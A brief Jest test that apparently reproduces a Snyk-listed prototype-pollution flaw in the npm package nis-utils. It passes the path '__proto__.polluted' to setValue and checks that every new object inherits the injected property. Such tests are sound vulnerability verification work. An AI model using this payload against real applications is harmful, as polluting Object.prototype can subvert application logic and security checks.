//https://snyk.io/vuln/SNYK-JS-NISUTILS-598799

test("prototype pollution in nis-utils", () => {
  const nisUtils = require("nis-utils");

  const object1 = {};
  expect({}.polluted).toBe(undefined);

  nisUtils.object.setValue({}, "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
